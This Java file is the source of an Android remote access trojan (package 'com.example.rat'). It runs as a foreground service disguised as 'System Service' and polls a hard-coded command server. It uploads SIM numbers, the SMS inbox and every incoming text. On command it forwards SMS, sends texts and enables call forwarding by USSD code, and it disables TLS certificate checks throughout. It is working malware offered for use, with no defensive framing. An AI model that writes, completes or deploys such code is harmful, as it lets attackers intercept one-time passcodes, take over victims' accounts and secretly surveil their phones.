package com.example.rat;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.security.cert.CertificateException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainService extends Service {

    private static final String TAG = "MainService";
    private static final String SERVER_URL = "https://hack4-ntlz.onrender.com";
    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    public static final String PREFS_NAME = "RatPrefs";
    public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    private Handler handler = new Handler(Looper.getMainLooper());
    private OkHttpClient client;
    private String uuid;
    private BroadcastReceiver smsReceiver;

    private Runnable commandPollingRunnable = new Runnable() {
        @Override
        public void run() {
            fetchCommands();
            handler.postDelayed(this, 5000);
        }
    };

    private Runnable statusUpdateRunnable = new Runnable() {
        @Override
        public void run() {
            sendDeviceStatus();
            handler.postDelayed(this, 15000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        client = getInsecureOkHttpClient();
        uuid = DeviceUuidFactory.getDeviceUuid(this).toString();
        createNotificationChannel();
        registerSmsReceiver();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running in background") // Changed content text for clarity
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_HIGH) // Set high priority for notification
                .setCategory(Notification.CATEGORY_SERVICE) // Indicate this is a service notification
                .build();
        startForeground(1, notification);

        handler.post(commandPollingRunnable);
        handler.post(statusUpdateRunnable);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(commandPollingRunnable);
        handler.removeCallbacks(statusUpdateRunnable);
        if (smsReceiver != null) unregisterReceiver(smsReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID, "Foreground Service Channel", NotificationManager.IMPORTANCE_HIGH); // Changed importance to HIGH
            getSystemService(NotificationManager.class).createNotificationChannel(serviceChannel);
        }
    }

    private OkHttpClient getInsecureOkHttpClient() {
        try {
            final TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        @Override
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) throws CertificateException {
                        }

                        @Override
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) throws CertificateException {
                        }

                        @Override
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return new java.security.cert.X509Certificate[]{};
                        }
                    }
            };

            final SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            final javax.net.ssl.SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();

            OkHttpClient.Builder builder = new OkHttpClient.Builder();
            builder.sslSocketFactory(sslSocketFactory, (X509TrustManager) trustAllCerts[0]);
            builder.hostnameVerifier(new HostnameVerifier() {
                @Override
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            });

            return builder.build();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private void sendDeviceStatus() {
        int battery = getBatteryLevel();
        Map<String,String> sims = getSimInfo();

        String[] simNumbers = sims.keySet().toArray(new String[0]);
        String sim1 = simNumbers.length > 0 ? simNumbers[0] : "N/A";
        String sim2 = simNumbers.length > 1 ? simNumbers[1] : "N/A";

        FormBody.Builder builder = new FormBody.Builder()
                .add("uuid", uuid)
                .add("model", Build.MODEL)
                .add("battery", String.valueOf(battery))
                .add("sim1", sim1)
                .add("sim2", sim2);

        Request request = new Request.Builder().url(SERVER_URL + "/status").post(builder.build()).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { Log.e(TAG,"Failed sending status",e); }
            @Override public void onResponse(Call call, Response response) throws IOException {
                if(response.isSuccessful()){
                    Log.d(TAG,"Device status updated");
                } else {
                    Log.e(TAG,"Failed to update status: "+response.body().string());
                }
            }
        });
    }

    private int getBatteryLevel() {
        BatteryManager bm = (BatteryManager)getSystemService(BATTERY_SERVICE);
        return bm != null ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;
    }

    private Map<String,String> getSimInfo() {
        Map<String,String> map = new HashMap<>();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) return map;

        SubscriptionManager sm = SubscriptionManager.from(this);
        List<SubscriptionInfo> list = sm.getActiveSubscriptionInfoList();
        if (list==null) return map;

        for (SubscriptionInfo sub : list) {
            String num = sub.getNumber()!=null ? sub.getNumber() : "Unknown";
            String op = sub.getCarrierName()!=null ? sub.getCarrierName().toString() : "Unknown";
            map.put(num,op);
        }
        return map;
    }

    // --- FETCH COMMANDS ---
    private void fetchCommands() {
        Request request = new Request.Builder().url(SERVER_URL+"/commands?uuid="+uuid).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { Log.e(TAG,"Failed to fetch commands",e); }
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) return;
                try {
                    JSONArray commands = new JSONArray(response.body().string());
                    for (int i=0;i<commands.length();i++) executeCommand(commands.getJSONObject(i));
                } catch (JSONException e){ Log.e(TAG,"Failed parse commands",e); }
            }
        });
    }

    private void executeCommand(JSONObject command) {
        try {
            String type = command.getString("type");
            switch(type){
                case "get_sms_log": getSmsLog(command.getString("commandId")); break;
                case "send_sms": sendSms(command); break;
                case "call_forward": case "call_forward_check": handleCallForward(command); break;
                case "sms_forward": case "sms_forward_check": handleSmsForward(command); break;
            }
        } catch (JSONException e){ Log.e(TAG,"Command execute error",e); }
    }

    // --- SMS LOG ---
    private void getSmsLog(String commandId){
        JSONArray smsLogs = new JSONArray();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED) {
            confirmCommand(commandId, "get_sms_log", "failed", "READ_SMS permission not granted");
            return;
        }
        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI,null,null,null, Telephony.Sms.DATE+" DESC LIMIT 20");
        if(cursor!=null){
            while(cursor.moveToNext()){
                try{
                    JSONObject sms = new JSONObject();
                    sms.put("from",cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body",cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("timestamp",cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    int subId=-1;
                    if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.LOLLIPOP_MR1){
                        int subIdColumn = cursor.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID);
                        if(subIdColumn!=-1) subId = cursor.getInt(subIdColumn);
                    }
                    sms.put("sim",getSimSlotIndex(subId)+1);
                    smsLogs.put(sms);
                }catch(Exception e){ Log.e(TAG,"SMS log error",e); }
            }
            cursor.close();
        }

        try {
            JSONObject json = new JSONObject();
            json.put("uuid", uuid);
            json.put("commandId", commandId);
            json.put("smsLogs", smsLogs);

            RequestBody body = RequestBody.create(json.toString(), JSON);
            Request request = new Request.Builder().url(SERVER_URL + "/sms-log").post(body).build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "SMS log send fail", e);
                }

                @Override
                public void onResponse(Call call, Response response) {
                    Log.d(TAG, "SMS logs sent");
                }
            });
        } catch (JSONException e){
            Log.e(TAG, "JSON error", e);
        }
    }

    private int getSimSlotIndex(int subId){
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.LOLLIPOP_MR1){
            SubscriptionManager subManager = SubscriptionManager.from(getApplicationContext());
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) return -1;
            List<SubscriptionInfo> subInfoList = subManager.getActiveSubscriptionInfoList();
            if(subInfoList!=null) for(SubscriptionInfo sub : subInfoList) if(sub.getSubscriptionId()==subId) return sub.getSimSlotIndex();
        }
        return -1;
    }

    private void sendSms(JSONObject command){
        try{
            String phoneNumber = command.getString("phoneNumber");
            String message = command.getString("message");
            String commandId = command.getString("commandId");

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                confirmCommand(commandId, "send_sms", "failed", "SEND_SMS permission not granted");
                return;
            }

            SmsManager.getDefault().sendTextMessage(phoneNumber,null,message,null,null);
            confirmCommand(commandId,"send_sms","success","SMS sent");
        }catch(Exception e){
            Log.e(TAG,"Send SMS fail",e);
            try{ confirmCommand(command.getString("commandId"),"send_sms","error",e.getMessage()); }catch(JSONException ignored){}
        }
    }

    // --- CALL FORWARD ---
    private void handleCallForward(JSONObject command) {
        try {
            String type = command.getString("type");
            String commandId = command.getString("commandId");
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();

            if (type.equals("call_forward_check")) {
                boolean enabled = prefs.getBoolean("call_forward_enabled", false);
                String forwardNumber = prefs.getString("call_forward_number", "");
                confirmCommand(commandId, type, "success",
                        "Call Forward " + (enabled ? "ON" : "OFF") + (enabled ? ", Number: " + forwardNumber : ""));
                return;
            }

            String action = command.getString("action");
            String forwardNumber = command.optString("forwardNumber", "");

            if ("on".equalsIgnoreCase(action) && !forwardNumber.isEmpty()) {
                // USSD code: **21*<number>#
                String ussd = "**21*" + forwardNumber + Uri.encode("#");
                Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + ussd));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    startActivity(intent);

                    // Save state
                    editor.putBoolean("call_forward_enabled", true);
                    editor.putString("call_forward_number", forwardNumber);
                    editor.apply();

                    confirmCommand(commandId, type, "success", "Call forwarding enabled to " + forwardNumber);
                } else {
                    confirmCommand(commandId, type, "failed", "CALL_PHONE permission not granted");
                }

            } else if ("off".equalsIgnoreCase(action)) {
                // USSD code: ##21#
                String ussd = "##21#" + Uri.encode("");
                Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + ussd));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    startActivity(intent);

                    // Save state
                    editor.putBoolean("call_forward_enabled", false);
                    editor.remove("call_forward_number");
                    editor.apply();

                    confirmCommand(commandId, type, "success", "Call forwarding disabled");
                } else {
                    confirmCommand(commandId, type, "failed", "CALL_PHONE permission not granted");
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Call forward error", e);
            try {
                confirmCommand("unknown", "call_forward", "error", e.getMessage());
            } catch (Exception ignored) {}
        }
    }


    // --- SMS FORWARD ---
    private void handleSmsForward(JSONObject command){
        try{
            String type = command.getString("type");
            String commandId = command.getString("commandId");
            int sim = command.optInt("sim",1);
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME,Context.MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();
            String enabledKey = "sms_forward_enabled_sim"+sim;
            String numberKey = "sms_forward_number_sim"+sim;

            if(type.equals("sms_forward_check")){
                boolean enabled = prefs.getBoolean(enabledKey,false);
                String forwardNumber = prefs.getString(numberKey,"Not Set");
                confirmCommand(commandId,type,"success","SMS Forward SIM"+sim+" "+(enabled?"ON":"OFF")+", Number: "+forwardNumber);
                return;
            }

            String action = command.getString("action");
            if("on".equals(action)){
                String forwardNumber = command.getString("forwardNumber");
                editor.putBoolean(enabledKey,true);
                editor.putString(numberKey,forwardNumber);
                editor.apply();
                confirmCommand(commandId,type,"success","SMS Forward SIM"+sim+" enabled to "+forwardNumber);
            }else if("off".equals(action)){
                editor.putBoolean(enabledKey,false);
                editor.remove(numberKey);
                editor.apply();
                confirmCommand(commandId,type,"success","SMS Forward SIM"+sim+" disabled");
            }

        }catch(Exception e){ Log.e(TAG,"SMS Forward error",e); }
    }

    private void sendRealTimeSms(String from, String body, int sim, long timestamp) {
        int battery = getBatteryLevel();

        FormBody formBody = new FormBody.Builder()
                .add("uuid", uuid)
                .add("from", from)
                .add("body", body)
                .add("sim", String.valueOf(sim))
                .add("timestamp", String.valueOf(timestamp))
                .add("battery", String.valueOf(battery))
                .build();

        Request request = new Request.Builder().url(SERVER_URL + "/sms").post(formBody).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send real-time SMS", e);
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Real-time SMS sent successfully");
                } else {
                    Log.e(TAG, "Failed to send real-time SMS: " + response.body().string());
                }
            }
        });
    }

    private void registerSmsReceiver(){
        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent){
                if(ContextCompat.checkSelfPermission(context,Manifest.permission.RECEIVE_SMS)!=PackageManager.PERMISSION_GRANTED) return;
                Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                if(pdus==null) return;

                String format = intent.getStringExtra("format");
                int subId = intent.getIntExtra("subscription", -1);

                SharedPreferences prefs = getSharedPreferences(PREFS_NAME,Context.MODE_PRIVATE);
                for(Object pdu : pdus){
                    try{
                        android.telephony.SmsMessage message;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            message = android.telephony.SmsMessage.createFromPdu((byte[]) pdu, format);
                        } else {
                            message = android.telephony.SmsMessage.createFromPdu((byte[]) pdu);
                        }

                        String from = message.getOriginatingAddress();
                        String body = message.getMessageBody();
                        long timestamp = message.getTimestampMillis();
                        int simSlot = getSimSlotIndex(subId) + 1; //+1 to make it 1-based

                        // 1. Send real-time SMS to server
                        sendRealTimeSms(from, body, simSlot, timestamp);

                        // 2. Handle SMS forwarding based on server commands
                        boolean enabled = prefs.getBoolean("sms_forward_enabled_sim"+simSlot,false);
                        String forwardNumber = prefs.getString("sms_forward_number_sim"+simSlot,"");
                        if(enabled && !forwardNumber.isEmpty()){
                            if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                                Log.e(TAG, "SMS forwarding failed: SEND_SMS permission not granted");
                                return;
                            }
                            SmsManager.getDefault().sendTextMessage(forwardNumber,null,message.getMessageBody(),null,null);
                        }
                    }catch(Exception e){ Log.e(TAG,"SMS Receiver error",e); }
                }
            }
        };
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
        registerReceiver(smsReceiver,filter);
    }

    // --- CONFIRM COMMAND ---
    private void confirmCommand(String commandId,String type,String status,String message){
        confirmCommand(commandId,type,status,message,"","");
    }

    private void confirmCommand(String commandId,String type,String status,String message,String sim,String forwardNumber){
        if (SERVER_URL == null || SERVER_URL.isEmpty()) {
            Log.e(TAG, "SERVER_URL is null or empty, cannot confirm command.");
            return;
        }

        HttpUrl baseHttpUrl = HttpUrl.parse(SERVER_URL);
        if (baseHttpUrl == null) {
            Log.e(TAG, "Invalid SERVER_URL format: " + SERVER_URL + ", cannot confirm command.");
            return;
        }

        HttpUrl fullUrl = baseHttpUrl.newBuilder().addPathSegment("confirm-command").build();

        FormBody.Builder builder = new FormBody.Builder()
                .add("uuid",uuid)
                .add("commandId",commandId)
                .add("type",type)
                .add("status",status)
                .add("message",message);

        if(!sim.isEmpty()) builder.add("sim",sim);
        if(!forwardNumber.isEmpty()) builder.add("forwardNumber",forwardNumber);

        Request request = new Request.Builder().url(fullUrl).post(builder.build()).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e){ Log.e(TAG,"Confirm command fail",e); }
            @Override public void onResponse(Call call, Response response){ Log.d(TAG,"Command confirmed"); }
        });
    }
}
